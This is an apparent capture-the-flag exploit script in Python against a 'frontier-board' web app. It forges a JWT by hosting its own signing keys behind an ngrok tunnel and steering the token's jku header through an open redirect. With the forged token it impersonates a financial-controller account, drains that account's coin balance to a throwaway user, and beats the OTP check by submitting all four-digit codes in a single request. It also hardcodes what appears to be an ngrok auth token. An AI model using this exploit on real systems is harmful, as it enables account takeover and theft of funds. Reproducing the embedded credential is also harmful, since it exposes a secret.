import requests, jwt, datetime, os
from Crypto.PublicKey import RSA
from pyngrok import ngrok
from flask import Flask, jsonify
from jwt.utils import base64url_encode

HOST = 'http://127.0.0.1:1337'
REMOTE_JWKS = f'{HOST}/.well-known/jwks.json'
JWKS_PORT = 9000
FINANCIAL_EMAIL = 'financial-controller@frontier-board.htb'
COIN_SYMBOL = 'CLCR'

app = Flask(__name__)

jwks_data = {}

@app.route('/', methods=['GET'])
def serve_jwks():
    try:
        return jsonify(jwks_data), 200
    except Exception as e:
        app.logger.error(f'Error serving JWKS: {str(e)}')
        return jsonify({'error': 'Internal Server Error'}), 500

def fetch_kid_from_jwks():
    response = requests.get(REMOTE_JWKS)
    jwks = response.json()
    if 'keys' in jwks and len(jwks['keys']) > 0:
        kid = jwks['keys'][0]['kid']
        print(f'[+] Extracted kid: {kid}')
        return kid
    else:
        print('[-] No keys found in JWKS.')
        return None

def open_redirect(redirect):
    return  f'http://127.0.0.1:1337/api/analytics/redirect?ref=deeznuts&url={redirect}/'

def create_forged_jwt(jku_url, kid, priv_key, payload):
    headers = {
        'alg': 'RS256',
        'typ': 'JWT',
        'kid': kid,
        'jku': open_redirect(jku_url),
    }
    token = jwt.encode(payload, priv_key, algorithm='RS256', headers=headers)
    return token

def validate_token(token):
    response = requests.get(f'{HOST}/api/dashboard', headers={'Authorization': f'Bearer {forged_token}'})
    if response.status_code == 200:
        print('[+] JWT validation successful! Response:')
        print(response.json())
    else:
        print(f'[!] JWT validation failed. Status: {response.status_code}, Response: {response.text}')

print('[+] Generating RSA Key Pair...')
key_pair = RSA.generate(2048)
pub_key = key_pair.publickey()
priv_key = key_pair.export_key('PEM')

kid = fetch_kid_from_jwks()
print('[+] Fetching kid ...')

jwks_data = {
    'keys': [{
        'alg': 'RS256',
        'kty': 'RSA',
        'use': 'sig',
        'n': base64url_encode(int.to_bytes(pub_key.n, (pub_key.n.bit_length() + 7) // 8, 'big')).decode(),
        'e': base64url_encode(int.to_bytes(pub_key.e, (pub_key.e.bit_length() + 7) // 8, 'big')).decode(),
        'kid': kid,
    }]
}

def start_flask_app():
    app.run(host='127.0.0.1', port=JWKS_PORT, debug=True, use_reloader=False)

from threading import Thread
flask_thread = Thread(target=start_flask_app)
flask_thread.daemon = True
flask_thread.start()

print(f'[+] Flask JWKS Server is running on http://localhost:{JWKS_PORT}')

print('[+] Creating ngrok tunnel...')
ngrok.set_auth_token('34z19mymNz6HbusMxwpon_4M8xSdhh1xSBJ3dCwM88U')
public_url = ngrok.connect(JWKS_PORT, 'tcp').public_url.replace('tcp://', 'http://')

print(f'[+] JWKS Public URL: {public_url}')

# Create a forged JWT
payload = {
    'email': FINANCIAL_EMAIL,
    'iat': datetime.datetime.utcnow(),
    'exp': datetime.datetime.utcnow() + datetime.timedelta(days=0, hours=6, seconds=0)
}

forged_token = create_forged_jwt(public_url, kid, priv_key, payload)
print(f'[~] Forged JWT: {forged_token}')

print('[+] Validating forged JWT against /api/dashboard...')
validate_token(forged_token)

ngrok.disconnect(public_url)
print('[+] Cleanup completed.')

def register_user(email, password):
    user = {'email': email, 'password': password}
    r = requests.post(f'{HOST}/api/auth/register', json=user)
    if r.status_code == 200:
        print(f'User registered successfully: {email}')
    else:
        print(f'Failed to register user: {email}, Response: {r.text}')

def login_user(email, password):
    user = {'email': email, 'password': password}
    r = requests.post(f'{HOST}/api/auth/login', json=user)
    if r.status_code == 200:
        data = r.json()
        token = data['token']
        print(f'Login successful for: {email}, Token: {token}')
        return token
    else:
        print(f'Login failed for: {email}, Response: {r.text}')
        return None

def send_friend_request(token, to_email):
    r = requests.post(
        f'{HOST}/api/users/friend-request',
        json={'to': to_email},
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        print(f'Friend request sent to: {to_email}')
    else:
        print(f'Failed to send friend request to {to_email}: {r.text}')

def fetch_friend_requests(token):
    r = requests.get(
        f'{HOST}/api/users/friend-requests',
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        requests_data = r.json()
        print('Pending friend requests:', requests_data.get('requests', []))
    else:
        print(f'Failed to fetch friend requests: {r.status_code} {r.text}')

def accept_friend_request(token, from_email):
    r = requests.post(
        f'{HOST}/api/users/accept-friend',
        json={'from': from_email},
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        print(f'Friend request from {from_email} accepted.')
    else:
        print(f'Failed to accept friend request from {from_email}: {r.text}')

def fetch_balance(token):
    r = requests.get(f'{HOST}/api/crypto/balance', headers={'Authorization': f'Bearer {token}'})
    if r.status_code == 200:
        balances = r.json()
        for coin in balances:
            if coin['symbol'] == COIN_SYMBOL:
                print(f'Balance for {COIN_SYMBOL}: {coin["availableBalance"]}')
                return coin['availableBalance']
        else:
            print(f'Failed to fetch balances: {r.text}')
    return 0

def make_transaction(token, to_email, coin, amount):
    otps = [str(i).zfill(4) for i in range(1000, 10000)]

    r = requests.post(
        f'{HOST}/api/crypto/transaction',
        json={'to': to_email, 'coin': coin, 'amount': amount, 'otp': otps},
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        print(f'Transaction of {amount} {coin} to {to_email} completed successfully.')
    else:
        print(f'Failed to make transaction to {to_email}: {r.text}')

def fetch_flag(token):
    r = requests.get(f'{HOST}/api/dashboard', headers={'Authorization': f'Bearer {token}'})
    if r.status_code == 200:
        data = r.json()
        if 'flag' in data:
            print(f'Flag: {data["flag"]}')
        else:
            print('Flag not found in the response.')
    else:
        print(f'Failed to fetch dashboard: {r.text}')

dummy_user = {'email': f'dummy{os.urandom(4).hex()}@htb.com', 'password': '123'}

register_user(dummy_user['email'], dummy_user['password'])

dummy_token = login_user(dummy_user['email'], dummy_user['password'])

if dummy_token:
    send_friend_request(dummy_token, FINANCIAL_EMAIL)

financial_token = forged_token

if financial_token:
    fetch_friend_requests(financial_token)
    accept_friend_request(financial_token, dummy_user['email'])

if financial_token and dummy_token:
    cluster_credit_balance = fetch_balance(financial_token)
    if cluster_credit_balance > 0:
        make_transaction(financial_token, dummy_user['email'], COIN_SYMBOL, cluster_credit_balance)

    fetch_flag(financial_token)
    